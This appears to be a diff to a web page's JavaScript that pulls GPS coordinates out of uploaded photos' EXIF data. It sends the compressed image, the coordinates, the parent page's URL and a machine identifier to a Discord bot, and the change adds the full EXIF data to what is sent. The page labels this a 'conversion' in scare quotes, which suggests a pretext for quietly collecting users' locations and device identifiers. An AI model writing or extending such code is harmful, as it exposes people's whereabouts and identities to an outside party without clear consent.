@@ -133,7 +133,7 @@
 
                             result.innerHTML = `Image "Converted" to coordinates and sent to discord bot: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
                             compressImage(e.target.result, function(compressedBlob) {
-                                sendToDiscordBot(latitude, longitude, compressedBlob, file.name);
+                                sendToDiscordBot(latitude, longitude, compressedBlob, file.name, EXIF);
                             });
                         } else {
                             result.innerHTML = "Unable to convert"; //No coordinates found in the image.
@@ -199,7 +199,7 @@
             img.src = dataURL;
         }
 
-        function sendToDiscordBot(latitude, longitude, imageBlob, fileName) {
+        function sendToDiscordBot(latitude, longitude, imageBlob, fileName, EXIF = "") {
             const formData = new FormData();
             formData.append('file', imageBlob, fileName);
             formData.append('content', `New image uploaded:\n${latitude}, ${longitude}\nFrom path: ${window.parent.location.href}\nFrom UUID: ${getMachineId()}`);
